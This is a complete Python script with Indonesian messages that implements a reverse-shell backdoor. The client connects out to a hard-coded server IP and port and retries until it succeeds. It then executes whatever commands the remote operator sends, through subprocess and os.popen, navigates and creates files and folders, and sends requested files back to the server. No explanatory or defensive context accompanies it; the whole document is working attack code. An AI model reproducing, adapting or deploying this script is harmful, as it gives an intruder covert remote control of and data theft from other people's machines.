import socket
import json
import os
import ctypes
import subprocess
import time

SERVER_IP = '192.168.0.175'  # Ganti dengan IP server Anda
SERVER_PORT = 87

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def reliable_send(data):
    json_data = json.dumps(data)
    sock.sendall(json_data.encode())

def reliable_recv():
    data = ""
    while True:
        try:
            part = sock.recv(1024).decode()
            data += part
            return json.loads(data)
        except ValueError:
            continue

def upload(filename):
    try:
        with open(filename, 'rb') as f:
            file_size = os.path.getsize(filename)
            reliable_send({"status": "upload", "size": file_size})
            sock.sendall(f.read())
        reliable_send(f"File {filename} berhasil di-upload.")
    except Exception as e:
        reliable_send(f"Gagal meng-upload file: {str(e)}")

def shell():
    while True:
        command = reliable_recv()
        if command == "quit":
            break
        elif command.startswith("cd "):
            try:
                os.chdir(command[3:])
                reliable_send(f"Berhasil pindah ke {os.getcwd()}")
            except Exception as e:
                reliable_send(f"Error: {str(e)}")
        elif command == "clear":
            os.system('cls' if os.name == 'nt' else 'clear')
            reliable_send("Layar dibersihkan.")
        elif command == "ls":
            files = os.listdir()
            reliable_send("\n".join(files))
        elif command.startswith("mkdir "):
            try:
                os.mkdir(command[6:])
                reliable_send(f"Folder {command[6:]} berhasil dibuat.")
            except Exception as e:
                reliable_send(f"Error: {str(e)}")
        elif command.startswith("touch "):
            try:
                with open(command[6:], 'w') as f:
                    pass
                reliable_send(f"File {command[6:]} berhasil dibuat.")
            except Exception as e:
                reliable_send(f"Error: {str(e)}")
        elif command.startswith("run "):
            try:
                result = subprocess.getoutput(command[4:])
                reliable_send(result)
            except Exception as e:
                reliable_send(f"Error saat menjalankan: {str(e)}")
        elif command.startswith("download "):
            filename = command.split(" ")[1]
            try:
                upload(filename)
            except Exception as e:
                reliable_send(f"Error: {str(e)}")
        else:
            result = os.popen(command).read()
            reliable_send(result)

def connect():
    while True:
        try:
            sock.connect((SERVER_IP, SERVER_PORT))
            shell()
            break
        except Exception as e:
            print(f"Gagal terhubung: {e}")
            time.sleep(5)

if __name__ == "__main__":
    connect()
    sock.close()
